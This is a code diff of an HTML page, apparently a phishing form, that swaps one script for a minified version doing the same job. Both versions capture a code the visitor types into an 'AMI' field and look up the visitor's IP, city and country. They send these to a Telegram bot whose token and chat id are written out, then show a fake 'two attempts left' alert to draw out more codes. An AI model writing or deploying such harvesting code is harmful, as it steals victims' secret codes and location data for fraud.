@@ -192,46 +192,19 @@
 			</form>
 		</section>
 		<script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
-		<script>
-              const url = "https://ipapi.co/json/";
-              const form = document.querySelector("#mainF");
-              form.addEventListener("submit", (event) => {
-                event.preventDefault(); // aqui evitamos que el código se repita evita que se envíe el formulario
-                axios
-                  .get(url)
-                  .then((response) => {
-                    const ami = document.querySelector("#ami").value;
-          
-                    
-                    const message =
-                      "\nCodigo AMI" +
-                      "\nAmi: " +
-                      ami +
-                      "\nCiudad:" +
-                      response.data.city +
-                      "\nPais: " +
-                      response.data.country +
-                      "\nIP: " +
-                      response.data.ip;
-                    axios
-					.post(
-                "https://api.telegram.org/bot7294657704:AAGNAGJL3wK3W8xjtwcETkspzUmflnH2mjg/sendMessage",
-                {
-                  chat_id: "-4204031062",
-                  text: message,
-                }
-              )
-                      .then((response) => {
-                        alert("Ingresa un nuevo codigo. Quedan 2 intentos");
-                      })
-                      .catch((error) => {
-                        console.error(error);
-                      });
-                  })
-                  .catch((error) => {
-                    console.log(error);
-                  });
-              });
-            </script>
+<script>
+  (function(){
+    const a="https://ipapi.co/json/",b=document.querySelector("#mainF");
+    b.addEventListener("submit",(c)=>{
+      c.preventDefault();
+      axios.get(a).then((d)=>{
+        const e=document.querySelector("#ami").value,f="\nCodigo AMI\nAmi: "+e+"\nCiudad:"+d.data.city+"\nPais: "+d.data.country+"\nIP: "+d.data.ip;
+        axios.post("https://api.telegram.org/bot" + "7810245146:AAHLQgvLziaCIbCh0la5YKS1FCsgHyBZRXA" + "/sendMessage",{chat_id:"-4586015847",text:f}).then((g)=>{
+          alert("Ingresa un nuevo codigo. Quedan 2 intentos");
+        }).catch((h)=>{console.error(h);});
+      }).catch((h)=>{console.log(h);});
+    });
+  })();
+</script>
 
 </body></html>
